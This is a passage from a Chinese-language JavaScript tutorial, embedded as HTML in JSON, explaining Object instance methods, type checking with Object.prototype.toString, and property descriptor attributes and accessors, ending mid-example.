<p>除了上面提到的两个方法，<code>Object</code>还有不少其他静态方法，将在后文逐一详细介绍。</p>\n<p><strong>（1）对象属性模型的相关方法</strong></p>\n<ul>\n<li><code>Object.getOwnPropertyDescriptor()</code>：获取某个属性的描述对象。</li>\n<li><code>Object.defineProperty()</code>：通过描述对象，定义某个属性。</li>\n<li><code>Object.defineProperties()</code>：通过描述对象，定义多个属性。</li>\n</ul>\n<p><strong>（2）控制对象状态的方法</strong></p>\n<ul>\n<li><code>Object.preventExtensions()</code>：防止对象扩展。</li>\n<li><code>Object.isExtensible()</code>：判断对象是否可扩展。</li>\n<li><code>Object.seal()</code>：禁止对象配置。</li>\n<li><code>Object.isSealed()</code>：判断一个对象是否可配置。</li>\n<li><code>Object.freeze()</code>：冻结一个对象。</li>\n<li><code>Object.isFrozen()</code>：判断一个对象是否被冻结。</li>\n</ul>\n<p><strong>（3）原型链相关方法</strong></p>\n<ul>\n<li><code>Object.create()</code>：该方法可以指定原型对象和属性，返回一个新的对象。</li>\n<li><code>Object.getPrototypeOf()</code>：获取对象的<code>Prototype</code>对象。</li>\n</ul>\n\n        <h2>\n            <a href='#Object-的实例方法' class='header-anchor'>#</a>\n            <span>Object 的实例方法</span>\n        </h2>\n    <p>除了静态方法，还有不少方法定义在<code>Object.prototype</code>对象。它们称为实例方法，所有<code>Object</code>的实例对象都继承了这些方法。</p>\n<p><code>Object</code>实例对象的方法，主要有以下六个。</p>\n<ul>\n<li><code>Object.prototype.valueOf()</code>：返回当前对象对应的值。</li>\n<li><code>Object.prototype.toString()</code>：返回当前对象对应的字符串形式。</li>\n<li><code>Object.prototype.toLocaleString()</code>：返回当前对象对应的本地字符串形式。</li>\n<li><code>Object.prototype.hasOwnProperty()</code>：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。</li>\n<li><code>Object.prototype.isPrototypeOf()</code>：判断当前对象是否为另一个对象的原型。</li>\n<li><code>Object.prototype.propertyIsEnumerable()</code>：判断某个属性是否可枚举。</li>\n</ul>\n<p>本节介绍前四个方法，另外两个方法将在后文相关章节介绍。</p>\n\n        <h3>\n            <a href='#Object.prototype.valueOf()' class='header-anchor'>#</a>\n            <span>Object.prototype.valueOf()</span>\n        </h3>\n    <p><code>valueOf</code>方法的作用是返回一个对象的“值”，默认情况下返回对象本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nobj.valueOf() === obj // true</code></pre><p>上面代码比较<code>obj.valueOf()</code>与<code>obj</code>本身，两者是一样的。</p>\n<p><code>valueOf</code>方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法（详见《数据类型转换》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n1 + obj // &quot;1[object Object]&quot;</code></pre><p>上面代码将对象<code>obj</code>与数字<code>1</code>相加，这时 JavaScript 就会默认调用<code>valueOf()</code>方法，求出<code>obj</code>的值再与<code>1</code>相加。所以，如果自定义<code>valueOf</code>方法，就可以得到想要的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nobj.valueOf = function () {\n  return 2;\n};\n\n1 + obj // 3</code></pre><p>上面代码自定义了<code>obj</code>对象的<code>valueOf</code>方法，于是<code>1 + obj</code>就得到了<code>3</code>。这种方法就相当于用自定义的<code>obj.valueOf</code>，覆盖<code>Object.prototype.valueOf</code>。</p>\n\n        <h3>\n            <a href='#Object.prototype.toString()' class='header-anchor'>#</a>\n            <span>Object.prototype.toString()</span>\n        </h3>\n    <p><code>toString</code>方法的作用是返回一个对象的字符串形式，默认情况下返回类型字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = new Object();\no1.toString() // &quot;[object Object]&quot;\n\nvar o2 = {a:1};\no2.toString() // &quot;[object Object]&quot;</code></pre><p>上面代码表示，对于一个对象调用<code>toString</code>方法，会返回字符串<code>[object Object]</code>，该字符串说明对象的类型。</p>\n<p>字符串<code>[object Object]</code>本身没有太大的用处，但是通过自定义<code>toString</code>方法，可以让对象在自动类型转换时，得到想要的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n\nobj.toString = function () {\n  return &#039;hello&#039;;\n};\n\nobj + &#039; &#039; + &#039;world&#039; // &quot;hello world&quot;</code></pre><p>上面代码表示，当对象用于字符串加法时，会自动调用<code>toString</code>方法。由于自定义了<code>toString</code>方法，所以返回字符串<code>hello world</code>。</p>\n<p>数组、字符串、函数、Date 对象都分别部署了自定义的<code>toString</code>方法，覆盖了<code>Object.prototype.toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].toString() // &quot;1,2,3&quot;\n\n&#039;123&#039;.toString() // &quot;123&quot;\n\n(function () {\n  return 123;\n}).toString()\n// &quot;function () {\n//   return 123;\n// }&quot;\n\n(new Date()).toString()\n// &quot;Tue May 10 2016 09:11:31 GMT+0800 (CST)&quot;</code></pre><p>上面代码中，数组、字符串、函数、Date 对象调用<code>toString</code>方法，并不会返回<code>[object Object]</code>，因为它们都自定义了<code>toString</code>方法，覆盖原始方法。</p>\n\n        <h3>\n            <a href='#toString()-的应用：判断数据类型' class='header-anchor'>#</a>\n            <span>toString() 的应用：判断数据类型</span>\n        </h3>\n    <p><code>Object.prototype.toString</code>方法返回对象的类型字符串，因此可以用来判断一个值的类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.toString() // &quot;[object Object]&quot;</code></pre><p>上面代码调用空对象的<code>toString</code>方法，结果返回一个字符串<code>object Object</code>，其中第二个<code>Object</code>表示该值的构造函数。这是一个十分有用的判断数据类型的方法。</p>\n<p>由于实例对象可能会自定义<code>toString</code>方法，覆盖掉<code>Object.prototype.toString</code>方法，所以为了得到类型字符串，最好直接使用<code>Object.prototype.toString</code>方法。通过函数的<code>call</code>方法，可以在任意值上调用这个方法，帮助我们判断这个值的类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.prototype.toString.call(value)</code></pre><p>上面代码表示对<code>value</code>这个值调用<code>Object.prototype.toString</code>方法。</p>\n<p>不同数据类型的<code>Object.prototype.toString</code>方法返回值如下。</p>\n<ul>\n<li>数值：返回<code>[object Number]</code>。</li>\n<li>字符串：返回<code>[object String]</code>。</li>\n<li>布尔值：返回<code>[object Boolean]</code>。</li>\n<li>undefined：返回<code>[object Undefined]</code>。</li>\n<li>null：返回<code>[object Null]</code>。</li>\n<li>数组：返回<code>[object Array]</code>。</li>\n<li>arguments 对象：返回<code>[object Arguments]</code>。</li>\n<li>函数：返回<code>[object Function]</code>。</li>\n<li>Error 对象：返回<code>[object Error]</code>。</li>\n<li>Date 对象：返回<code>[object Date]</code>。</li>\n<li>RegExp 对象：返回<code>[object RegExp]</code>。</li>\n<li>其他对象：返回<code>[object Object]</code>。</li>\n</ul>\n<p>这就是说，<code>Object.prototype.toString</code>可以看出一个值到底是什么类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.prototype.toString.call(2) // &quot;[object Number]&quot;\nObject.prototype.toString.call(&#039;&#039;) // &quot;[object String]&quot;\nObject.prototype.toString.call(true) // &quot;[object Boolean]&quot;\nObject.prototype.toString.call(undefined) // &quot;[object Undefined]&quot;\nObject.prototype.toString.call(null) // &quot;[object Null]&quot;\nObject.prototype.toString.call(Math) // &quot;[object Math]&quot;\nObject.prototype.toString.call({}) // &quot;[object Object]&quot;\nObject.prototype.toString.call([]) // &quot;[object Array]&quot;</code></pre><p>利用这个特性，可以写出一个比<code>typeof</code>运算符更准确的类型判断函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var type = function (o){\n  var s = Object.prototype.toString.call(o);\n  return s.match(/\\[object (.*?)\\]/)[1].toLowerCase();\n};\n\ntype({}); // &quot;object&quot;\ntype([]); // &quot;array&quot;\ntype(5); // &quot;number&quot;\ntype(null); // &quot;null&quot;\ntype(); // &quot;undefined&quot;\ntype(/abcd/); // &quot;regex&quot;\ntype(new Date()); // &quot;date&quot;</code></pre><p>在上面这个<code>type</code>函数的基础上，还可以加上专门判断某种类型数据的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var type = function (o){\n  var s = Object.prototype.toString.call(o);\n  return s.match(/\\[object (.*?)\\]/)[1].toLowerCase();\n};\n\n[&#039;Null&#039;,\n &#039;Undefined&#039;,\n &#039;Object&#039;,\n &#039;Array&#039;,\n &#039;String&#039;,\n &#039;Number&#039;,\n &#039;Boolean&#039;,\n &#039;Function&#039;,\n &#039;RegExp&#039;\n].forEach(function (t) {\n  type[&#039;is&#039; + t] = function (o) {\n    return type(o) === t.toLowerCase();\n  };\n});\n\ntype.isObject({}) // true\ntype.isNumber(NaN) // true\ntype.isRegExp(/abc/) // true</code></pre>\n        <h3>\n            <a href='#Object.prototype.toLocaleString()' class='header-anchor'>#</a>\n            <span>Object.prototype.toLocaleString()</span>\n        </h3>\n    <p><code>Object.prototype.toLocaleString</code>方法与<code>toString</code>的返回结果相同，也是返回一个值的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.toString(obj) // &quot;[object Object]&quot;\nobj.toLocaleString(obj) // &quot;[object Object]&quot;</code></pre><p>这个方法的主要作用是留出一个接口，让各种不同的对象实现自己版本的<code>toLocaleString</code>，用来返回针对某些地域的特定的值。目前，主要有三个对象自定义了<code>toLocaleString</code>方法。</p>\n<ul>\n<li>Array.prototype.toLocaleString()</li>\n<li>Number.prototype.toLocaleString()</li>\n<li>Date.prototype.toLocaleString()</li>\n</ul>\n<p>举例来说，日期的实例对象的<code>toString</code>和<code>toLocaleString</code>返回值就不一样，而且<code>toLocaleString</code>的返回值跟用户设定的所在地域相关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var date = new Date();\ndate.toString() // &quot;Tue Jan 01 2018 12:01:33 GMT+0800 (CST)&quot;\ndate.toLocaleString() // &quot;1/01/2018, 12:01:33 PM&quot;</code></pre>\n        <h3>\n            <a href='#Object.prototype.hasOwnProperty()' class='header-anchor'>#</a>\n            <span>Object.prototype.hasOwnProperty()</span>\n        </h3>\n    <p><code>Object.prototype.hasOwnProperty</code>方法接受一个字符串作为参数，返回一个布尔值，表示该实例对象自身是否具有该属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: 123\n};\n\nobj.hasOwnProperty(&#039;p&#039;) // true\nobj.hasOwnProperty(&#039;toString&#039;) // false</code></pre><p>上面代码中，对象<code>obj</code>自身具有<code>p</code>属性，所以返回<code>true</code>。<code>toString</code>属性是继承的，所以返回<code>false</code>。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/08/protecting-objects.html\">Protecting objects in JavaScript</a></li>\n<li>kangax, <a href=\"http://perfectionkills.com/understanding-delete/\">Understanding delete</a></li>\n<li>Jon Bretman, <a href=\"http://techblog.badoo.com/blog/2013/11/01/type-checking-in-javascript/\">Type Checking in JavaScript</a></li>\n<li>Cody Lindley, <a href=\"http://tech.pro/tutorial/1671/thinking-about-ecmascript-5-parts\">Thinking About ECMAScript 5 Parts</a></li>\n<li>Bjorn Tipling, <a href=\"http://bjorn.tipling.com/advanced-objects-in-javascript\">Advanced objects in JavaScript</a></li>\n<li>Javier Márquez, <a href=\"http://arqex.com/967/javascript-properties-enumerable-writable-configurable\">Javascript properties are enumerable, writable and configurable</a></li>\n<li>Sella Rafaeli, <a href=\"http://www.sellarafaeli.com/blog/native_javascript_data_binding\">Native JavaScript Data-Binding</a>: 使用存取函数实现model与view的双向绑定</li>\n<li>Lea Verou, <a href=\"http://lea.verou.me/2015/08/copying-properties-the-robust-way/\">Copying object properties, the robust way</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"属性描述对象","link":"/stdlib/attributes.html"}],"content":"\n        <h1>\n            <a href='#属性描述对象' class='header-anchor'>#</a>\n            <span>属性描述对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 提供了一个内部数据结构，用来描述对象的属性，控制它的行为，比如该属性是否可写、可遍历等等。这个内部数据结构称为“属性描述对象”（attributes object）。每个属性都有自己对应的属性描述对象，保存该属性的一些元信息。</p>\n<p>下面是属性描述对象的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n  value: 123,\n  writable: false,\n  enumerable: true,\n  configurable: false,\n  get: undefined,\n  set: undefined\n}</code></pre><p>属性描述对象提供6个元属性。</p>\n<p>（1）<code>value</code></p>\n<p><code>value</code>是该属性的属性值，默认为<code>undefined</code>。</p>\n<p>（2）<code>writable</code></p>\n<p><code>writable</code>是一个布尔值，表示属性值（value）是否可改变（即是否可写），默认为<code>true</code>。</p>\n<p>（3）<code>enumerable</code></p>\n<p><code>enumerable</code>是一个布尔值，表示该属性是否可遍历，默认为<code>true</code>。如果设为<code>false</code>，会使得某些操作（比如<code>for...in</code>循环、<code>Object.keys()</code>）跳过该属性。</p>\n<p>（4）<code>configurable</code></p>\n<p><code>configurable</code>是一个布尔值，表示可配置性，默认为<code>true</code>。如果设为<code>false</code>，将阻止某些操作改写该属性，比如无法删除该属性，也不得改变该属性的属性描述对象（<code>value</code>属性除外）。也就是说，<code>configurable</code>属性控制了属性描述对象的可写性。</p>\n<p>（5）<code>get</code></p>\n<p><code>get</code>是一个函数，表示该属性的取值函数（getter），默认为<code>undefined</code>。</p>\n<p>（6）<code>set</code></p>\n<p><code>set</code>是一个函数，表示该属性的存值函数（setter），默认为<code>undefined</code>。</p>\n\n        <h2>\n            <a href='#Object.getOwnPropertyDescriptor()' class='header-anchor'>#</a>\n            <span>Object.getOwnPropertyDescriptor()</span>\n        </h2>\n    <p><code>Object.getOwnPropertyDescriptor</code>方法可以获取属性描述对象。它的第一个参数是一个对象，第二个参数是一个字符串，对应该对象的某个属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;)\n// Object { value: &quot;a&quot;,\n//   writable: true,\n//   enumerable: true,\n//   configurable: true\n// }</code></pre><p>上面代码中，<code>Object.getOwnPropertyDescriptor</code>方法获取<code>obj.p</code>的属性描述对象。</p>\n<p>注意，<code>Object.getOwnPropertyDescriptor</code>方法只能用于对象自身的属性，不能用于继承的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.getOwnPropertyDescriptor(obj, &#039;toString&#039;)\n// undefined</code></pre><p>上面代码中，<code>toString</code>是<code>Obj</code>对象继承的属性，<code>Object.getOwnPropertyDescriptor</code>无法获取。</p>\n\n        <h2>\n            <a href='#Object.getOwnPropertyNames()' class='header-anchor'>#</a>\n            <span>Object.getOwnPropertyNames()</span>\n        </h2>\n    <p><code>Object.getOwnPropertyNames</code>方法返回一个数组，成员是参数对象自身的全部属性的属性名，不管该属性是否可遍历。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperties({}, {\n  p1: { value: 1, enumerable: true },\n  p2: { value: 2, enumerable: false }\n});\n\nObject.getOwnPropertyNames(obj)\n// [&quot;p1&quot;, &quot;p2&quot;]</code></pre><p>上面代码中，<code>obj.p1</code>是可遍历的，<code>obj.p2</code>是不可遍历的。<code>Object.getOwnPropertyNames</code>会将它们都返回。</p>\n<p>这跟<code>Object.keys</code>的行为不同，<code>Object.keys</code>只返回对象自身的可遍历属性的全部属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.keys([]) // []\nObject.getOwnPropertyNames([]) // [ &#039;length&#039; ]\n\nObject.keys(Object.prototype) // []\nObject.getOwnPropertyNames(Object.prototype)\n// [&#039;hasOwnProperty&#039;,\n//  &#039;valueOf&#039;,\n//  &#039;constructor&#039;,\n//  &#039;toLocaleString&#039;,\n//  &#039;isPrototypeOf&#039;,\n//  &#039;propertyIsEnumerable&#039;,\n//  &#039;toString&#039;]</code></pre><p>上面代码中，数组自身的<code>length</code>属性是不可遍历的，<code>Object.keys</code>不会返回该属性。第二个例子的<code>Object.prototype</code>也是一个对象，所有实例对象都会继承它，它自身的属性都是不可遍历的。</p>\n\n        <h2>\n            <a href='#Object.defineProperty()，Object.defineProperties()' class='header-anchor'>#</a>\n            <span>Object.defineProperty()，Object.defineProperties()</span>\n        </h2>\n    <p><code>Object.defineProperty</code>方法允许通过属性描述对象，定义或修改一个属性，然后返回修改后的对象，它的用法如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.defineProperty(object, propertyName, attributesObject)</code></pre><p><code>Object.defineProperty</code>方法接受三个参数，依次如下。</p>\n<ul>\n<li>属性所在的对象</li>\n<li>属性名（它应该是一个字符串）</li>\n<li>属性描述对象</li>\n</ul>\n<p>举例来说，定义<code>obj.p</code>可以写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 123,\n  writable: false,\n  enumerable: true,\n  configurable: false\n});\n\nobj.p // 123\n\nobj.p = 246;\nobj.p // 123</code></pre><p>上面代码中，<code>Object.defineProperty</code>方法定义了<code>obj.p</code>属性。由于属性描述对象的<code>writable</code>属性为<code>false</code>，所以<code>obj.p</code>属性不可写。注意，这里的<code>Object.defineProperty</code>方法的第一个参数是<code>{}</code>（一个新建的空对象），<code>p</code>属性直接定义在这个空对象上面，然后返回这个对象，这是<code>Object.defineProperty</code>的常见写法。</p>\n<p>如果属性已经存在，<code>Object.defineProperty</code>方法相当于更新该属性的属性描述对象。</p>\n<p>如果一次性定义或修改多个属性，可以使用<code>Object.defineProperties</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperties({}, {\n  p1: { value: 123, enumerable: true },\n  p2: { value: &#039;abc&#039;, enumerable: true },\n  p3: { get: function () { return this.p1 + this.p2 },\n    enumerable:true,\n    configurable:true\n  }\n});\n\nobj.p1 // 123\nobj.p2 // &quot;abc&quot;\nobj.p3 // &quot;123abc&quot;</code></pre><p>上面代码中，<code>Object.defineProperties</code>同时定义了<code>obj</code>对象的三个属性。其中，<code>p3</code>属性定义了取值函数<code>get</code>，即每次读取该属性，都会调用这个取值函数。</p>\n<p>注意，一旦定义了取值函数<code>get</code>（或存值函数<code>set</code>），就不能将<code>writable</code>属性设为<code>true</code>，或者同时定义<code>value</code>属性，否则会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nObject.defineProperty(obj, &#039;p&#039;, {\n  value: 123,\n  get: function() { return 456; }\n});\n// TypeError: Invalid property.\n// A property cannot both have accessors and be writable or have a value\n\nObject.defineProperty(obj, &#039;p&#039;, {\n  writable: true,\n  get: function() { return 456; }\n});\n// TypeError: Invalid property descriptor.\n// Cannot both specify accessors and a value or writable attribute</code></pre><p>上面代码中，同时定义了<code>get</code>属性和<code>value</code>属性，以及将<code>writable</code>属性设为<code>true</code>，就会报错。</p>\n<p><code>Object.defineProperty()</code>和<code>Object.defineProperties()</code>的第三个参数，是一个属性对象。它的<code>writable</code>、<code>configurable</code>、<code>enumerable</code>这三个属性的默认值都为<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nObject.defineProperty(obj, &#039;foo&#039;, {});\nObject.getOwnPropertyDescriptor(obj, &#039;foo&#039;)\n// {\n//   value: undefined,\n//   writable: false,\n//   enumerable: false,\n//   configurable: false\n// }</code></pre><p>上面代码中，定义<code>obj.p</code>时用了一个空的属性描述对象，就可以看到各个元属性的默认值。</p>\n\n        <h2>\n            <a href='#Object.prototype.propertyIsEnumerable()' class='header-anchor'>#</a>\n            <span>Object.prototype.propertyIsEnumerable()</span>\n        </h2>\n    <p>实例对象的<code>propertyIsEnumerable</code>方法返回一个布尔值，用来判断某个属性是否可遍历。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.p = 123;\n\nobj.propertyIsEnumerable(&#039;p&#039;) // true\nobj.propertyIsEnumerable(&#039;toString&#039;) // false</code></pre><p>上面代码中，<code>obj.p</code>是可遍历的，而继承自原型对象的<code>obj.toString</code>属性是不可遍历的。</p>\n\n        <h2>\n            <a href='#元属性' class='header-anchor'>#</a>\n            <span>元属性</span>\n        </h2>\n    <p>属性描述对象的各个属性称为“元属性”，因为它们可以看作是控制属性的属性。</p>\n\n        <h3>\n            <a href='#value' class='header-anchor'>#</a>\n            <span>value</span>\n        </h3>\n    <p><code>value</code>属性是目标属性的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.p = 123;\n\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;).value\n// 123\n\nObject.defineProperty(obj, &#039;p&#039;, { value: 246 });\nobj.p // 246</code></pre><p>上面代码是通过<code>value</code>属性，读取或改写<code>obj.p</code>的例子。</p>\n\n        <h3>\n            <a href='#writable' class='header-anchor'>#</a>\n            <span>writable</span>\n        </h3>\n    <p><code>writable</code>属性是一个布尔值，决定了目标属性的值（value）是否可以被改变。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nObject.defineProperty(obj, &#039;a&#039;, {\n  value: 37,\n  writable: false\n});\n\nobj.a // 37\nobj.a = 25;\nobj.a // 37</code></pre><p>上面代码中，<code>obj.a</code>的<code>writable</code>属性是<code>false</code>。然后，改变<code>obj.a</code>的值，不会有任何效果。</p>\n<p>注意，正常模式下，对<code>writable</code>为<code>false</code>的属性赋值不会报错，只会默默失败。但是，严格模式下会报错，即使对<code>a</code>属性重新赋予一个同样的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar obj = {};\n\nObject.defineProperty(obj, &#039;a&#039;, {\n  value: 37,\n  writable: false\n});\n\nobj.a = 37;\n// Uncaught TypeError: Cannot assign to read only property &#039;a&#039; of object</code></pre><p>上面代码是严格模式，对<code>obj.a</code>任何赋值行为都会报错。</p>\n<p>如果原型对象的某个属性的<code>writable</code>为<code>false</code>，那么子对象将无法自定义这个属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var proto = Object.defineProperty({}, &#039;foo&#039;, {\n  value: &#039;a&#039;,\n  writable: false\n});\n\nvar obj = Object.create(proto);\n\nobj.foo = &#039;b&#039;;\nobj.foo // &#039;a&#039;</code></pre><p>上面代码中，<code>proto</code>是原型对象，它的<code>foo</code>属性不可写。<code>obj</code>对象继承<code>proto</code>，也不可以再自定义这个属性了。如果是严格模式，这样做还会抛出一个错误。</p>\n<p>但是，有一个规避方法，就是通过覆盖属性描述对象，绕过这个限制。原因是这种情况下，原型链会被完全忽视。</p>\n<pre class=\"prettyprint language-javascript\"><code>var proto = Object.defineProperty({}, &#039;foo&#039;, {\n  value: &#039;a&#039;,\n  writable: false\n});\n\nvar obj = Object.create(proto);\nObject.defineProperty(obj, &#039;foo&#039;, {\n  value: &#039;b&#039;\n});\n\nobj.foo // &quot;b&quot;</code></pre>\n        <h3>\n            <a href='#enumerable' class='header-anchor'>#</a>\n            <span>enumerable</span>\n        </h3>\n    <p><code>enumerable</code>（可遍历性）返回一个布尔值，表示目标属性是否可遍历。</p>\n<p>JavaScript 的早期版本，<code>for...in</code>循环是基于<code>in</code>运算符的。我们知道，<code>in</code>运算符不管某个属性是对象自身的还是继承的，都会返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n&#039;toString&#039; in obj // true</code></pre><p>上面代码中，<code>toString</code>不是<code>obj</code>对象自身的属性，但是<code>in</code>运算符也返回<code>true</code>，这导致了<code>toString</code>属性也会被<code>for...in</code>循环遍历。</p>\n<p>这显然不太合理，后来就引入了“可遍历性”这个概念。只有可遍历的属性，才会被<code>for...in</code>循环遍历，同时还规定<code>toString</code>这一类实例对象继承的原生属性，都是不可遍历的，这样就保证了<code>for...in</code>循环的可用性。</p>\n<p>具体来说，如果一个属性的<code>enumerable</code>为<code>false</code>，下面三个操作不会取到该属性。</p>\n<ul>\n<li><code>for..in</code>循环</li>\n<li><code>Object.keys</code>方法</li>\n<li><code>JSON.stringify</code>方法</li>\n</ul>\n<p>因此，<code>enumerable</code>可以用来设置“秘密”属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nObject.defineProperty(obj, &#039;x&#039;, {\n  value: 123,\n  enumerable: false\n});\n\nobj.x // 123\n\nfor (var key in obj) {\n  console.log(key);\n}\n// undefined\n\nObject.keys(obj)  // []\nJSON.stringify(obj) // &quot;{}&quot;</code></pre><p>上面代码中，<code>obj.x</code>属性的<code>enumerable</code>为<code>false</code>，所以一般的遍历操作都无法获取该属性，使得它有点像“秘密”属性，但不是真正的私有属性，还是可以直接获取它的值。</p>\n<p>注意，<code>for...in</code>循环包括继承的属性，<code>Object.keys</code>方法不包括继承的属性。如果需要获取对象自身的所有属性，不管是否可遍历，可以使用<code>Object.getOwnPropertyNames</code>方法。</p>\n<p>另外，<code>JSON.stringify</code>方法会排除<code>enumerable</code>为<code>false</code>的属性，有时可以利用这一点。如果对象的 JSON 格式输出要排除某些属性，就可以把这些属性的<code>enumerable</code>设为<code>false</code>。</p>\n\n        <h3>\n            <a href='#configurable' class='header-anchor'>#</a>\n            <span>configurable</span>\n        </h3>\n    <p><code>configurable</code>(可配置性）返回一个布尔值，决定了是否可以修改属性描述对象。也就是说，<code>configurable</code>为<code>false</code>时，<code>value</code>、<code>writable</code>、<code>enumerable</code>和<code>configurable</code>都不能被修改了。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  writable: false,\n  enumerable: false,\n  configurable: false\n});\n\nObject.defineProperty(obj, &#039;p&#039;, {value: 2})\n// TypeError: Cannot redefine property: p\n\nObject.defineProperty(obj, &#039;p&#039;, {writable: true})\n// TypeError: Cannot redefine property: p\n\nObject.defineProperty(obj, &#039;p&#039;, {enumerable: true})\n// TypeError: Cannot redefine property: p\n\nObject.defineProperty(obj, &#039;p&#039;, {configurable: true})\n// TypeError: Cannot redefine property: p</code></pre><p>上面代码中，<code>obj.p</code>的<code>configurable</code>为<code>false</code>。然后，改动<code>value</code>、<code>writable</code>、<code>enumerable</code>、<code>configurable</code>，结果都报错。</p>\n<p>注意，<code>writable</code>只有在<code>false</code>改为<code>true</code>会报错，<code>true</code>改为<code>false</code>是允许的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  writable: true,\n  configurable: false\n});\n\nObject.defineProperty(obj, &#039;p&#039;, {writable: false})\n// 修改成功</code></pre><p>至于<code>value</code>，只要<code>writable</code>和<code>configurable</code>有一个为<code>true</code>，就允许改动。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  writable: true,\n  configurable: false\n});\n\nObject.defineProperty(o1, &#039;p&#039;, {value: 2})\n// 修改成功\n\nvar o2 = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  writable: false,\n  configurable: true\n});\n\nObject.defineProperty(o2, &#039;p&#039;, {value: 2})\n// 修改成功</code></pre><p>另外，<code>configurable</code>为<code>false</code>时，直接目标属性赋值，不报错，但不会成功。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  configurable: false\n});\n\nobj.p = 2;\nobj.p // 1</code></pre><p>上面代码中，<code>obj.p</code>的<code>configurable</code>为<code>false</code>，对<code>obj.p</code>赋值是不会生效的。如果是严格模式，还会报错。</p>\n<p>可配置性决定了目标属性是否可以被删除（delete）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperties({}, {\n  p1: { value: 1, configurable: true },\n  p2: { value: 2, configurable: false }\n});\n\ndelete obj.p1 // true\ndelete obj.p2 // false\n\nobj.p1 // undefined\nobj.p2 // 2</code></pre><p>上面代码中，<code>obj.p1</code>的<code>configurable</code>是<code>true</code>，所以可以被删除，<code>obj.p2</code>就无法删除。</p>\n\n        <h2>\n            <a href='#存取器' class='header-anchor'>#</a>\n            <span>存取器</span>\n        </h2>\n    <p>除了直接定义以外，属性还可以用存取器（accessor）定义。其中，存值函数称为<code>setter</code>，使用属性描述对象的<code>set</code>属性；取值函数称为<code>getter</code>，使用属性描述对象的<code>get</code>属性。</p>\n<p>一旦对目标属性定义了存取器，那么存取的时候，都将执行对应的函数。利用这个功能，可以实现许多高级特性，比如某个属性禁止赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  get: function () {\n    return &#039;getter&#039;;\n  },\n  set: function (value) {\n    console.log(&#039;setter: &#039; + value);\n  }\n});\n\nobj.p // &quot;getter&quot;\nobj.p = 123 // &quot;setter: 123&quot;</code></pre><p>上面代码中，<code>obj.p</code>定义了<code>get</code>和<code>set</code>属性。<code>obj.p</code>取值时，就会调用<code>get</code>；赋值时，就会调用<code>set</code>。</p>\n<p>JavaScript 还提供了存取器的另一种写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  get p() {\n    return &#039;getter&#039;;\n  },\n  set p(value) {\n    console.log(&#039;setter: &#039; + value);\n  }\n};</code></pre><p>上面的写法与定义属性描述对象是等价的，而且使用更广泛。</p>\n<p>注意，取值函数<code>get</code>不能接受参数，存值函数<code>set</code>只能接受一个参数（即属性的值）。</p>\n<p>存取器往往用于，属性的值依赖对象内部数据的场合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj ={\n  $n : 5,\n  get next() { return this.$n++ },\n  set next(n) {\n    if (n &gt;= this.$n) this.$n = n;\n    else throw new Error(&#039;新的值必须大于当前值&#039;);\n  }\n};\n\nobj.next // 